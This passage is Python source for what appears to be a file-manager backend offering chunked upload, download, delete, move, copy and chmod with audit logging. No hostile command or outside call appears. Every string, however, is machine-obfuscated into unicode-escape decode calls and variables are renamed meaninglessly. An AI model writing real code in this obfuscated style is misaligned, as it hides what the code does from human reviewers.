        self._audit(codecs.decode('\\u0063\\u0061\\u0074', 'unicode_escape'), file_path, codecs.decode('\\u006f\\u006b', 'unicode_escape'), {codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): O0_var_412.stat().st_size, codecs.decode('\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'): O0_var_414})
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(O0_var_412.relative_to(self.O0_fn_106)), codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074', 'unicode_escape'): O0_var_413, codecs.decode('\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'): O0_var_414, codecs.decode('\\u0069\\u0073\\u005f\\u0062\\u0069\\u006e\\u0061\\u0072\\u0079', 'unicode_escape'): O0_var_415, codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): O0_var_412.stat().st_size}

    def upload_file(self, file_content: bytes, target_path: str, filename: str=None, chunk_id: int=None, total_chunks: int=None) -> dict:
        O0_var_416 = self._safe_path(target_path)
        if O0_var_416.is_dir():
            if not filename:
                raise HTTPException(400, codecs.decode('\\u0066\\u0069\\u006c\\u0065\\u006e\\u0061\\u006d\\u0065\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064\\u0020\\u0066\\u006f\\u0072\\u0020\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u006f\\u0072\\u0079\\u0020\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'))
            O0_var_416 = O0_var_416 / filename
        O0_var_416 = self._safe_path(str(O0_var_416))
        if len(file_content) > self.max_upload and chunk_id is None:
            raise HTTPException(413, codecs.decode('\\u0046\\u0069\\u006c\\u0065\\u0020\\u0074\\u006f\\u006f\\u0020\\u006c\\u0061\\u0072\\u0067\\u0065\\u003a\\u0020\\u0075\\u0073\\u0065\\u0020\\u0063\\u0068\\u0075\\u006e\\u006b\\u0065\\u0064\\u0020\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'))
        try:
            self._validate_parent_directory(O0_var_416)
            O0_var_416.parent.mkdir(parents=True, exist_ok=True)
            if chunk_id is not None and total_chunks is not None:
                O0_var_417 = hashlib.md5(O0_var_416.as_posix().encode()).hexdigest()
                self.chunk_dir.mkdir(parents=True, exist_ok=True)
                O0_var_418 = self.chunk_dir / (str(O0_var_417) + codecs.decode('\\u002e\\u0063\\u0068\\u0075\\u006e\\u006b\\u002e', 'unicode_escape') + str(chunk_id))
                with open(O0_var_418, codecs.decode('\\u0077\\u0062', 'unicode_escape')) as O0_var_419:
                    O0_var_419.write(file_content)
                O0_var_420 = list(self.chunk_dir.glob(str(O0_var_417) + codecs.decode('\\u002e\\u0063\\u0068\\u0075\\u006e\\u006b\\u002e\\u002a', 'unicode_escape')))
                if len(O0_var_420) == total_chunks:
                    O0_var_421 = self.chunk_dir / (str(O0_var_417) + codecs.decode('\\u002e\\u006c\\u006f\\u0063\\u006b', 'unicode_escape'))
                    try:
                        with open(O0_var_421, codecs.decode('\\u0078', 'unicode_escape')):
                            pass
                    except FileExistsError:
                        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0070\\u0065\\u006e\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0063\\u0065\\u0069\\u0076\\u0065\\u0064', 'unicode_escape'): len(O0_var_420), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): total_chunks, codecs.decode('\\u006d\\u0073\\u0067', 'unicode_escape'): codecs.decode('\\u006d\\u0065\\u0072\\u0067\\u0069\\u006e\\u0067\\u0020\\u0069\\u006e\\u0020\\u0070\\u0072\\u006f\\u0067\\u0072\\u0065\\u0073\\u0073', 'unicode_escape')}
                    try:
                        with open(O0_var_416, codecs.decode('\\u0077\\u0062', 'unicode_escape')) as O0_var_422:
                            for O0_var_423 in range(total_chunks):
                                O0_var_424 = self.chunk_dir / (str(O0_var_417) + codecs.decode('\\u002e\\u0063\\u0068\\u0075\\u006e\\u006b\\u002e', 'unicode_escape') + str(O0_var_423))
                                with open(O0_var_424, codecs.decode('\\u0072\\u0062', 'unicode_escape')) as O0_var_425:
                                    O0_var_422.write(O0_var_425.read())
                                O0_var_424.unlink()
                        self._audit(codecs.decode('\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064\\u005f\\u0063\\u0068\\u0075\\u006e\\u006b\\u0065\\u0064', 'unicode_escape'), str(O0_var_416), codecs.decode('\\u006d\\u0065\\u0072\\u0067\\u0065\\u0064', 'unicode_escape'), {codecs.decode('\\u0063\\u0068\\u0075\\u006e\\u006b\\u0073', 'unicode_escape'): total_chunks, codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): O0_var_416.stat().st_size})
                        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(O0_var_416.relative_to(self.O0_fn_106)), codecs.decode('\\u0063\\u0068\\u0075\\u006e\\u006b\\u0065\\u0064', 'unicode_escape'): True}
                    finally:
                        if O0_var_421.exists():
                            O0_var_421.unlink()
                else:
                    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0070\\u0065\\u006e\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0063\\u0065\\u0069\\u0076\\u0065\\u0064', 'unicode_escape'): len(O0_var_420), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): total_chunks}
            else:
                with open(O0_var_416, codecs.decode('\\u0077\\u0062', 'unicode_escape')) as O0_var_419:
                    O0_var_419.write(file_content)
                self._audit(codecs.decode('\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'), str(O0_var_416), codecs.decode('\\u006f\\u006b', 'unicode_escape'), {codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): len(file_content)})
                return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(O0_var_416.relative_to(self.O0_fn_106))}
        except Exception as e:
            raise FileOperationError(codecs.decode('\\u0055\\u0070\\u006c\\u006f\\u0061\\u0064\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(e), e) from e

    def download_file(self, file_path: str) -> tuple:
        O0_var_426 = self._safe_path(file_path)
        if not O0_var_426.exists():
            raise HTTPException(404, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u003a\\u0020', 'unicode_escape') + str(file_path))
        if not O0_var_426.is_file():
            raise HTTPException(400, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0061\\u0020\\u0066\\u0069\\u006c\\u0065\\u003a\\u0020', 'unicode_escape') + str(file_path))
        O0_var_427, O0_var_428 = mimetypes.guess_type(str(O0_var_426))
        self._audit(codecs.decode('\\u0064\\u006f\\u0077\\u006e\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'), str(O0_var_426), codecs.decode('\\u006f\\u006b', 'unicode_escape'), {codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): O0_var_426.stat().st_size})
        return (O0_var_426, O0_var_427 or codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u006f\\u0063\\u0074\\u0065\\u0074\\u002d\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape'), O0_var_426.stat().st_size)

    def delete_paths(self, O0_var_429: List[str]) -> dict:
        O0_var_430 = []
        for O0_var_431 in O0_var_429:
            try:
                O0_var_432 = self._safe_path(O0_var_431)
                if not O0_var_432.exists():
                    O0_var_430.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_431, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006e\\u006f\\u0074\\u005f\\u0066\\u006f\\u0075\\u006e\\u0064', 'unicode_escape')})
                    continue
                try:
                    self._delete_target(O0_var_432)
                except (PermissionError, OSError):
                    time.sleep(0.3)
                    self._delete_target(O0_var_432)
                O0_var_430.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_431, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0064\\u0065\\u006c\\u0065\\u0074\\u0065\\u0064', 'unicode_escape')})
                self._audit(codecs.decode('\\u0064\\u0065\\u006c\\u0065\\u0074\\u0065', 'unicode_escape'), O0_var_431, codecs.decode('\\u006f\\u006b', 'unicode_escape'))
            except HTTPException as e:
                O0_var_430.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_431, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e.detail)})
            except Exception as e:
                O0_var_430.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_431, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e)})
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): O0_var_430}

    @staticmethod
    def _delete_target(target):
        if target.is_dir():
            shutil.rmtree(target)
        else:
            target.unlink()

    def move_paths(self, O0_var_433: Dict[str, str]) -> dict:
        O0_var_434 = []
        for O0_var_435, O0_var_436 in O0_var_433.items():
            try:
                O0_var_437 = self._safe_path(O0_var_435)
                O0_var_438 = self._safe_path(O0_var_436)
                if not O0_var_437.exists():
                    O0_var_434.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_435, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_436, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0073\\u006b\\u0069\\u0070\\u0070\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0073\\u006f\\u0075\\u0072\\u0063\\u0065\\u0020\\u006e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064', 'unicode_escape')})
                    continue
                if O0_var_438.exists():
                    O0_var_434.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_435, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_436, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0044\\u0065\\u0073\\u0074\\u0069\\u006e\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0065\\u0078\\u0069\\u0073\\u0074\\u0073', 'unicode_escape')})
                    continue
                self._validate_parent_directory(O0_var_438)
                O0_var_438.parent.mkdir(parents=True, exist_ok=True)
                shutil.move(str(O0_var_437), str(O0_var_438))
                O0_var_434.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): str(O0_var_437.relative_to(self.O0_fn_106)), codecs.decode('\\u0074\\u006f', 'unicode_escape'): str(O0_var_438.relative_to(self.O0_fn_106)), codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape')})
                self._audit(codecs.decode('\\u006d\\u006f\\u0076\\u0065\\u005f\\u0062\\u0061\\u0074\\u0063\\u0068', 'unicode_escape'), str(O0_var_435) + codecs.decode('\\u0020\\u002d\\u003e\\u0020', 'unicode_escape') + str(O0_var_436), codecs.decode('\\u006f\\u006b', 'unicode_escape'))
            except HTTPException as e:
                O0_var_434.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_435, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_436, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0064\\u0065\\u006e\\u0069\\u0065\\u0064', 'unicode_escape') if e.status_code == 403 else codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0070\\u0061\\u0074\\u0068\\u0020\\u006f\\u0075\\u0074\\u0073\\u0069\\u0064\\u0065\\u0020\\u0066\\u0069\\u006c\\u0065\\u0020\\u0072\\u006f\\u006f\\u0074', 'unicode_escape') if e.status_code == 403 else str(e.detail)})
            except NotADirectoryError:
                O0_var_434.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_435, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_436, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0064\\u0065\\u006e\\u0069\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0064\\u0065\\u0073\\u0074\\u0069\\u006e\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0070\\u0061\\u0072\\u0065\\u006e\\u0074\\u0020\\u0069\\u0073\\u0020\\u006e\\u006f\\u0074\\u0020\\u0061\\u0020\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u006f\\u0072\\u0079', 'unicode_escape')})
            except Exception as e:
                O0_var_434.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_435, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_436, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e)})
        O0_var_439 = sum((1 for O0_var_440 in O0_var_434 if O0_var_440[codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')] == codecs.decode('\\u006f\\u006b', 'unicode_escape')))
        O0_var_441 = len(O0_var_433)
        self._audit(codecs.decode('\\u006d\\u006f\\u0076\\u0065\\u005f\\u0062\\u0061\\u0074\\u0063\\u0068', 'unicode_escape'), str(list(O0_var_433.keys())), codecs.decode('\\u0063\\u006f\\u006d\\u0070\\u006c\\u0065\\u0074\\u0065\\u0064', 'unicode_escape'), {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_441, codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): O0_var_439})
        return _file_batch_result(O0_var_441, O0_var_439, O0_var_434)

    def copy_paths(self, O0_var_442: Dict[str, str]) -> dict:
        O0_var_443 = []
        for O0_var_444, O0_var_445 in O0_var_442.items():
            try:
                O0_var_446 = self._safe_path(O0_var_444)
                O0_var_447 = self._safe_path(O0_var_445)
                if not O0_var_446.exists():
                    O0_var_443.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_444, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_445, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0073\\u006b\\u0069\\u0070\\u0070\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0073\\u006f\\u0075\\u0072\\u0063\\u0065\\u0020\\u006e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064', 'unicode_escape')})
                    continue
                if O0_var_447.is_dir():
                    O0_var_447 = O0_var_447 / O0_var_446.name
                if O0_var_447.exists():
                    O0_var_443.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_444, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_445, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0044\\u0065\\u0073\\u0074\\u0069\\u006e\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0065\\u0078\\u0069\\u0073\\u0074\\u0073', 'unicode_escape')})
                    continue
                self._validate_parent_directory(O0_var_447)
                O0_var_447.parent.mkdir(parents=True, exist_ok=True)
                if O0_var_446.is_file():
                    shutil.copy2(str(O0_var_446), str(O0_var_447))
                else:
                    try:
                        O0_var_447.relative_to(O0_var_446)
                    except ValueError:
                        pass
                    else:
                        O0_var_443.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_444, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_445, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0064\\u0065\\u0073\\u0074\\u0069\\u006e\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0069\\u0073\\u0020\\u0069\\u006e\\u0073\\u0069\\u0064\\u0065\\u0020\\u0073\\u006f\\u0075\\u0072\\u0063\\u0065\\u0020\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u006f\\u0072\\u0079', 'unicode_escape')})
                        continue
                    shutil.copytree(str(O0_var_446), str(O0_var_447), symlinks=True)
                O0_var_443.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): str(O0_var_446.relative_to(self.O0_fn_106)), codecs.decode('\\u0074\\u006f', 'unicode_escape'): str(O0_var_447.relative_to(self.O0_fn_106)), codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape')})
                self._audit(codecs.decode('\\u0063\\u006f\\u0070\\u0079\\u005f\\u0062\\u0061\\u0074\\u0063\\u0068', 'unicode_escape'), str(O0_var_444) + codecs.decode('\\u0020\\u002d\\u003e\\u0020', 'unicode_escape') + str(O0_var_445), codecs.decode('\\u006f\\u006b', 'unicode_escape'))
            except HTTPException as e:
                O0_var_443.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_444, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_445, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0064\\u0065\\u006e\\u0069\\u0065\\u0064', 'unicode_escape') if e.status_code == 403 else codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0070\\u0061\\u0074\\u0068\\u0020\\u006f\\u0075\\u0074\\u0073\\u0069\\u0064\\u0065\\u0020\\u0066\\u0069\\u006c\\u0065\\u0020\\u0072\\u006f\\u006f\\u0074', 'unicode_escape') if e.status_code == 403 else str(e.detail)})
            except NotADirectoryError:
                O0_var_443.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_444, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_445, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0064\\u0065\\u006e\\u0069\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0064\\u0065\\u0073\\u0074\\u0069\\u006e\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0070\\u0061\\u0072\\u0065\\u006e\\u0074\\u0020\\u0069\\u0073\\u0020\\u006e\\u006f\\u0074\\u0020\\u0061\\u0020\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u006f\\u0072\\u0079', 'unicode_escape')})
            except Exception as e:
                O0_var_443.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_444, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_445, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e)})
        O0_var_448 = sum((1 for O0_var_449 in O0_var_443 if O0_var_449[codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')] == codecs.decode('\\u006f\\u006b', 'unicode_escape')))
        O0_var_450 = len(O0_var_442)
        self._audit(codecs.decode('\\u0063\\u006f\\u0070\\u0079\\u005f\\u0062\\u0061\\u0074\\u0063\\u0068', 'unicode_escape'), str(list(O0_var_442.keys())), codecs.decode('\\u0063\\u006f\\u006d\\u0070\\u006c\\u0065\\u0074\\u0065\\u0064', 'unicode_escape'), {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_450, codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): O0_var_448})
        return _file_batch_result(O0_var_450, O0_var_448, O0_var_443)

    def _parse_mode(self, O0_var_451: str) -> int:
        O0_var_451 = O0_var_451.strip()
        if O0_var_451.isdigit() or (O0_var_451.startswith(codecs.decode('\\u0030', 'unicode_escape')) and O0_var_451[1:].isdigit()):
            return int(O0_var_451, 8)
        if len(O0_var_451) == 9 and all((O0_var_452 in codecs.decode('\\u0072\\u0077\\u0078\\u0053\\u0074\\u0054\\u002d', 'unicode_escape') for O0_var_452 in O0_var_451)):
            O0_var_453 = 0
            O0_var_454 = {codecs.decode('\\u0072', 'unicode_escape'): 4, codecs.decode('\\u0077', 'unicode_escape'): 2, codecs.decode('\\u0078', 'unicode_escape'): 1, codecs.decode('\\u0053', 'unicode_escape'): 0, codecs.decode('\\u0073', 'unicode_escape'): 1, codecs.decode('\\u0054', 'unicode_escape'): 0, codecs.decode('\\u0074', 'unicode_escape'): 1, codecs.decode('\\u002d', 'unicode_escape'): 0}
            for O0_var_455, O0_var_456 in enumerate(O0_var_451):
                if O0_var_456 in O0_var_454:
                    O0_var_457 = 2 - O0_var_455 % 3
                    O0_var_453 |= O0_var_454[O0_var_456] << 6 - O0_var_455 // 3 * 3 + O0_var_457
            return O0_var_453
        if any((O0_var_458 in O0_var_451 for O0_var_458 in [codecs.decode('\\u003d', 'unicode_escape'), codecs.decode('\\u002b', 'unicode_escape'), codecs.decode('\\u002d', 'unicode_escape')])) and any((O0_var_459 in O0_var_451 for O0_var_459 in [codecs.decode('\\u0075', 'unicode_escape'), codecs.decode('\\u0067', 'unicode_escape'), codecs.decode('\\u006f', 'unicode_escape'), codecs.decode('\\u0061', 'unicode_escape')])):
            raise ValueError(codecs.decode('\\u0053\\u0079\\u006d\\u0062\\u006f\\u006c\\u0069\\u0063\\u0020\\u006d\\u006f\\u0064\\u0065\\u0020\\u0027', 'unicode_escape') + str(O0_var_451) + codecs.decode('\\u0027\\u0020\\u006e\\u006f\\u0074\\u0020\\u0066\\u0075\\u006c\\u006c\\u0079\\u0020\\u0073\\u0075\\u0070\\u0070\\u006f\\u0072\\u0074\\u0065\\u0064\\u0020\\u0079\\u0065\\u0074\\u002c\\u0020\\u0075\\u0073\\u0065\\u0020\\u006f\\u0063\\u0074\\u0061\\u006c\\u0020\\u006c\\u0069\\u006b\\u0065\\u0020\\u0027\\u0037\\u0035\\u0035\\u0027', 'unicode_escape'))
        raise ValueError(codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u006d\\u006f\\u0064\\u0065\\u0020\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u003a\\u0020\\u0027', 'unicode_escape') + str(O0_var_451) + codecs.decode('\\u0027\\u002e\\u0020\\u0055\\u0073\\u0065\\u0020\\u0027\\u0037\\u0035\\u0035\\u0027\\u002c\\u0020\\u0027\\u0030\\u0036\\u0034\\u0034\\u0027\\u002c\\u0020\\u006f\\u0072\\u0020\\u0027\\u0072\\u0077\\u0078\\u0072\\u002d\\u0078\\u0072\\u002d\\u0078\\u0027', 'unicode_escape'))

    def set_authority(self, O0_var_460: Dict[str, str], recursive: bool=False) -> dict:
        O0_var_461 = []
        for O0_var_462, O0_var_463 in O0_var_460.items():
            try:
                O0_var_464 = self._safe_path(O0_var_462)
                if not O0_var_464.exists():
                    O0_var_461.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_462, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064', 'unicode_escape')})
                    continue
                O0_var_465 = self._parse_mode(O0_var_463)
                if recursive and O0_var_464.is_dir():
                    for O0_var_466, O0_var_467, O0_var_468 in os.walk(O0_var_464):
                        os.chmod(O0_var_466, O0_var_465)
                        for O0_var_469 in O0_var_467:
                            os.chmod(os.path.join(O0_var_466, O0_var_469), O0_var_465)
                        for O0_var_470 in O0_var_468:
                            os.chmod(os.path.join(O0_var_466, O0_var_470), O0_var_465)
                else:
                    os.chmod(O0_var_464, O0_var_465)
                O0_var_471 = stat.filemode(O0_var_464.stat().st_mode)
                O0_var_461.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(O0_var_464.relative_to(self.O0_fn_106)), codecs.decode('\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0065\\u0064', 'unicode_escape'): O0_var_463, codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0065\\u0064', 'unicode_escape'): O0_var_471, codecs.decode('\\u006d\\u006f\\u0064\\u0065\\u005f\\u006f\\u0063\\u0074\\u0061\\u006c', 'unicode_escape'): oct(stat.S_IMODE(O0_var_464.stat().st_mode)), codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape')})
                self._audit(codecs.decode('\\u0063\\u0068\\u006d\\u006f\\u0064', 'unicode_escape'), O0_var_462, codecs.decode('\\u006f\\u006b', 'unicode_escape'), {codecs.decode('\\u006d\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_463, codecs.decode('\\u0072\\u0065\\u0063\\u0075\\u0072\\u0073\\u0069\\u0076\\u0065', 'unicode_escape'): recursive})
            except HTTPException as e:
                O0_var_461.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_462, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e.detail)})
            except ValueError as e:
                O0_var_461.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_462, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e)})
            except PermissionError:
